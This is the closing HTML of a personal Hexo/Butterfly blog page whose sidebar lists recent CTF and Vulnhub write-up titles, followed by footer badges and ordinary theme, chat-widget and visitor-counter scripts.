alt="Vulnhub靶机--AI-Web1"/></a><div class="content"><a class="title" href="/posts/ff3ef111/" title="Vulnhub靶机--AI-Web1">Vulnhub靶机--AI-Web1</a><time datetime="2024-09-02T05:24:07.000Z" title="发表于 2024-09-02 13:24:07">2024-09-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/5286b664/" title="WEB刷一刷"><img src="/img/web.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WEB刷一刷"/></a><div class="content"><a class="title" href="/posts/5286b664/" title="WEB刷一刷">WEB刷一刷</a><time datetime="2024-08-10T03:08:57.000Z" title="发表于 2024-08-10 11:08:57">2024-08-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/54d49677/" title="CISCN2023烧烤摊儿"><img src="/img/PWNciscn.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CISCN2023烧烤摊儿"/></a><div class="content"><a class="title" href="/posts/54d49677/" title="CISCN2023烧烤摊儿">CISCN2023烧烤摊儿</a><time datetime="2024-08-09T08:07:34.000Z" title="发表于 2024-08-09 16:07:34">2024-08-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d66b9a90/" title="BUUCTF 刮开有奖"><img src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF 刮开有奖"/></a><div class="content"><a class="title" href="/posts/d66b9a90/" title="BUUCTF 刮开有奖">BUUCTF 刮开有奖</a><time datetime="2024-08-08T04:00:00.000Z" title="发表于 2024-08-08 12:00:00">2024-08-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/fd137f81/" title="Syetem()与Execve()的区别"><img src="/img/pwn1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Syetem()与Execve()的区别"/></a><div class="content"><a class="title" href="/posts/fd137f81/" title="Syetem()与Execve()的区别">Syetem()与Execve()的区别</a><time datetime="2024-08-07T04:00:00.000Z" title="发表于 2024-08-07 12:00:00">2024-08-07</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/web.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2024 By Zs</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">I wish you to become your own sun, no need to rely on who's light.
+<p>
+  <a target="_blank" href="https://hexo.io/">
+    <img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo">
+  </a>&nbsp;
+  <a target="_blank" href="https://butterfly.js.org/">
+    <img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly">
+  </a>&nbsp;
+  <a target="_blank" href="https://www.jsdelivr.com/">
+    <img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用JsDelivr为静态资源提供CDN加速">
+  </a>&nbsp;
+  <a target="_blank" href="https://vercel.com/">
+    <img src="https://img.shields.io/badge/Hosted-Vervel-brightgreen?style=flat&logo=Vercel" title="本站采用双线部署，默认线路托管于Vercel">
+  </a>&nbsp;
+  <a target="_blank" href="https://vercel.com/">
+    <img src="https://img.shields.io/badge/Hosted-Coding-0cedbe?style=flat&logo=Codio" title="本站采用双线部署，联通线路托管于Coding">
+  </a>&nbsp;
+  <a target="_blank" href="https://github.com/">
+    <img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Github托管">
+  </a>&nbsp;
+  <a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">
+    <img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可">
+  </a>
+</p>
+<script src="//code.tidio.co/igzcydyc0v4yli1cqhy75vfxpqucu4lm.js"></script>
+</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><!-- hexo injector body_end start --><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '2s');
+    arr[i].setAttribute('data-wow-delay', '1s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --></body></html>
